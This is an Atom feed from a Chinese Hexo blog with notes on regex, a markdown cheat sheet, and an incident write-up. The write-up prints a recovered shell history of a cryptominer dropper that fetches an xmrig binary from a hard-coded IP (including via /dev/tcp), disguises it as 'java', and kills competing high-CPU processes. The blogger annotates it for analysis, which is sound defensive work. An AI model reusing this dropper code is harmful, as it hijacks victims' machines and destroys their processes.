<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>rouxianer&#39;s share</title>
  
  <subtitle>交流，分享</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-01-04T06:11:35.912Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>lucciolash</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sed、awk与正则表达式（未整理）</title>
    <link href="http://yoursite.com/2018/01/04/regular-expression/"/>
    <id>http://yoursite.com/2018/01/04/regular-expression/</id>
    <published>2018-01-04T02:34:42.000Z</published>
    <updated>2018-01-04T06:11:35.912Z</updated>
    
    <content type="html"><![CDATA[<p>##bash通配符<br>?:单字符通配<br>*:多字符通配符<br>[]:括号条件内匹配</p><p>通配符是完全匹配；<br>正则是包含匹配</p><p>anaconda-ks.cfg<br>是安装信息</p><p>grep awk sed等命令可以使用正则表达式(linux三大利器)<br>ls find cp 不能使用正则，只能使用通配符</p><p>##正则表达式</p><table><thead><tr><th>查找</th><th>测试</th></tr></thead><tbody><tr><td>取出</td><td>测试</td></tr><tr><td>匹配</td><td>测试</td></tr></tbody></table><pre><code>     特定字符字符  范围内字符     任意字符</code></pre><p>特定字符</p><p>范围内字符<br>[]<br>[0-9]<br>[a-z]<br>[A-Z]<br>[a-zA-Z]<br>[,:_/]<br>反向字符^<br>取反：[^0-9]</p><p>任意字符<br>.<br>tips:<br>   [.]:取本身字符.<br>    .:转义，还是表达字符.</p><p>边界字符：头尾字符<br>^: ^root 表示以其开头<br>\$: false$ 表示以其结尾<br>空行的表示:^$</p><p>元字符（代表普通字符或特殊字符）<br>\w:匹配任何字类字符，包括下划线([a-zA-Z0-9<em>])<br>\W:匹配任何非字类字符，包括下划线([a-zA-Z0-9</em>])<br>\b:单词分隔符  \bx\b</p><p>正则表达式字符组合<br>字符串<br>‘root’ ‘passwd’ ‘pa..wd’<br>[A-Z][a-z] ‘[0-9][0-9]’<br>tips:正则表达式的坑:最大匹配原则，既包含原则，结果超出预期，增加限定符</p><p>增则表达式字符组合</p><p>字符串  重复<br>       逻辑</p><p>重复<br>*:0次或多次，匹配前面的字符或子表达式<br>+:一次或多次，匹配前面的字符或子表达式(使用需要用转义字符)<br>?:0次或一次，匹配前面的字符或子表达式  </p><p>重复特定次数:{n,m}<br>*:{0,}<br>+:{1,}<br>?:{0,1}</p><p>任意字符串的表示：.<em><br>例如：^r.</em> m.*c</p><p>tips:正则坑2:贪婪匹配方式，尽可能匹配，能有多长匹配多长</p><p>逻辑的表示<br>|:’/bin(false|true)‘</p><p>4-10位qq号</p><p>[0-9]</p><p>15或18位身份证（处理x）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##bash通配符&lt;br&gt;?:单字符通配&lt;br&gt;*:多字符通配符&lt;br&gt;[]:括号条件内匹配&lt;/p&gt;
&lt;p&gt;通配符是完全匹配；&lt;br&gt;正则是包含匹配&lt;/p&gt;
&lt;p&gt;anaconda-ks.cfg&lt;br&gt;是安装信息&lt;/p&gt;
&lt;p&gt;grep awk sed等命令可以使用正则表达
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一次攻击分析</title>
    <link href="http://yoursite.com/2018/01/03/webs/exp_of_em_respon/"/>
    <id>http://yoursite.com/2018/01/03/webs/exp_of_em_respon/</id>
    <published>2018-01-03T03:31:15.000Z</published>
    <updated>2018-01-04T02:36:14.082Z</updated>
    
    <content type="html"><![CDATA[<p>##起因<br>昨天下班儿回家的路上，同事突然通过微信发了一个<strong>新建 Microsoft office word 2007 文档.docx</strong>过来。怀着下班懈怠的想法我并没有打开这个文档:）<br><del>而且他连名字都不改！懒惰！</del><br>稍后上了地铁，得知是一个业务系统被攻击了，业务在不断重启（当时说的是服务器，后来说是软件服务），他发给我的是一个现场的日志。后来听大佬说是可能是误kill了关键服务，所以导致服务重启；</p><p>下面先看一下history里的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">916  sPid=$$  //获得当前程序（shell）的pid</span><br><span class="line">917  mPid=&apos;&apos;  //估计是脚本pid后面会赋值</span><br><span class="line">918  mName=&apos;java&apos;  //伪装名称为java</span><br><span class="line">919  checkCmd() &#123;</span><br><span class="line">         command -v $1 &gt;/dev/null 2&gt;&amp;1;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>关于这条语句，可以查看这篇<a href="http://blog.csdn.net/ggxiaobai/article/details/53507530" target="_blank" rel="noopener">文章</a><br>看完是不是大概懂了这个bash指令的意思，<br>好的这条指令的意思是查看$1指令是否存在[拖走],$1是传参的第1个参数值（指令本身是第0个）</p><pre><code>920  downloader () {     if checkCmd wget; then//查看wget是否存在         wget $1 -O $2 ;     elif checkCmd curl; then//查看curl是否存在         curl $1 -o $2;     elif checkCmd python; then//查看是否装了python         if [ &quot;`python -c &quot;import sys; print(sys.version_info[0])&quot;`&quot; = &quot;3&quot; ]; then         //判断是不是python3             python -c &quot;from urllib.request import urlopen;             u = urlopen(&apos;&quot;$1&quot;&apos;); localFile = open(&apos;&quot;$2&quot;&apos;, &apos;wb&apos;);             localFile.write(u.read()); localFile.close()&quot;;         else          //python2的情况             python -c &quot;from urllib import urlopen;            u = urlopen(&apos;&quot;$1&quot;&apos;);            localFile = open(&apos;&quot;$2&quot;&apos;, &apos;wb&apos;);             localFile.write(u.read());             localFile.close()&quot;;         fi;      else         cat &lt; /dev/tcp/165.227.215.25/5555 &gt; $2;         //把/dev/tcp/165.227.215.25/5555的内容定向输入到$2     fi;     chmod +x $2;     }921  killer() {         for tmpVar in `ps -aeo pid,%cpu,command | sed 1d | sort -k 2 | tail -n 10 | awk &apos;{print $1}&apos;`;         //查看进程里pid,%cpu,command三列，删除第一列，按照第二列排序，取最后10个结果，取第一列的值         //查看进程中cpu占用率最高的10个进程         do             if [ $tmpVar = $sPid ]; then                 continue;             //如果pid是shell的pid             fi;             if [ $tmpVar = $mPid ]; then             //如果pid是该脚本的pid                 continue；             fi;             if [ `ps -o %cpu $tmpVar | sed 1d | sed &apos;s/\..*//g&apos;` -ge 60 ]; then             //                 if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep java` ]; then                     continue;                 fi;                     if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep sh` ]; then                     continue;                              fi;                              if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep bash` ]; then                                      continue;                              fi;                              kill -9 $tmpVar;                 rm -f `ls -l /proc/$tmpVar/exe 2&gt;&amp;1 | sed &apos;s/.*-&gt; //g&apos;`;                 fi;                  done;       }922  runer() {         if [ -z &quot;$mPid&quot; ]; then             if [ ! -f $mName ]; then                  downloader http://165.227.215.25/xmrig-y $mName;             fi;                      chmod +x ./$mName;             ./$mName;         fi;         mPid=`ps -eo pid,command | grep $mName | head -n 1 | awk &apos;{print $1}&apos;`;     }923  pkill python; pkill $mName924  downloader http://165.227.215.25/xmrig-y $mName925  ps -ef|grep java</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##起因&lt;br&gt;昨天下班儿回家的路上，同事突然通过微信发了一个&lt;strong&gt;新建 Microsoft office word 2007 文档.docx&lt;/strong&gt;过来。怀着下班懈怠的想法我并没有打开这个文档:）&lt;br&gt;&lt;del&gt;而且他连名字都不改！懒惰！&lt;/del&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://yoursite.com/2017/12/30/markdown/"/>
    <id>http://yoursite.com/2017/12/30/markdown/</id>
    <published>2017-12-30T01:04:29.000Z</published>
    <updated>2018-01-02T08:17:47.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="markdown笔记"><a href="#markdown笔记" class="headerlink" title="markdown笔记"></a>markdown笔记</h1><p>Just for test</p><p>##常用语法</p><p>###标题<br>在文本前输入#用于声明标题，随数量增加级别递减；</p><p>###粗体<br>在内容两侧分别加<strong>2个星号</strong>，**文本内容**；<strong>示例</strong></p><p>###斜体<br>在内容两侧分别加<strong>1个星号</strong>，*文本内容*；<em>示例</em></p><p>###删除线<br>在内容两侧分别加<strong>2个波浪线</strong>，~~文本内容~~;<del>示例</del></p><p>###分割线<br>使用<strong>3个星号</strong>或者<strong>3个小短线</strong>，使用3个小短线会强制把上一行内容设置为2级标题;</p><h2 id="3个星号"><a href="#3个星号" class="headerlink" title="3个星号"></a><code>3个星号</code></h2><p><code>3个星号</code></p><hr><p>###外链<br>使用<code>**\[描述](链接地址)**</code>格式添加外链；<br>示例：<a href="about:blank" target="_blank" rel="noopener">空白页</a></p><p>###单行代码<br>在内容两侧分别加<strong>2个`(一称小句号)</strong>，`文本内容`;<code>示例</code></p><p>###多行代码<br>在内容两侧分别加<strong>3个`</strong>，```文本内容```;<br>(需要在文本后多换一行)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我有行号  </span><br><span class="line">我有行号  </span><br><span class="line">我有行号</span><br></pre></td></tr></table></figure><p>或者换新行，然后在段落头输入<strong><code>Tab</code></strong>，或<strong><code>4个空格</code></strong>  </p><pre><code>我没有行号我没有行号我没有行号</code></pre><p>###引入内容<br>在内容前添加<strong>></strong>表示引入内容；</p><blockquote><p>示例  </p></blockquote><p>###插入图片<br>使用<code>**\![描述](链接地址)**</code>插入图片；<br><img src="/assets/img/end.jpeg" alt="没有"><br><img src="/assets/img/end.jpeg" onmouseover="alert('nothing else');alert('thanks')"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;markdown笔记&quot;&gt;&lt;a href=&quot;#markdown笔记&quot; class=&quot;headerlink&quot; title=&quot;markdown笔记&quot;&gt;&lt;/a&gt;markdown笔记&lt;/h1&gt;&lt;p&gt;Just for test&lt;/p&gt;
&lt;p&gt;##常用语法&lt;/p&gt;
&lt;p&gt;###
      
    
    </summary>
    
    
  </entry>
  
</feed>
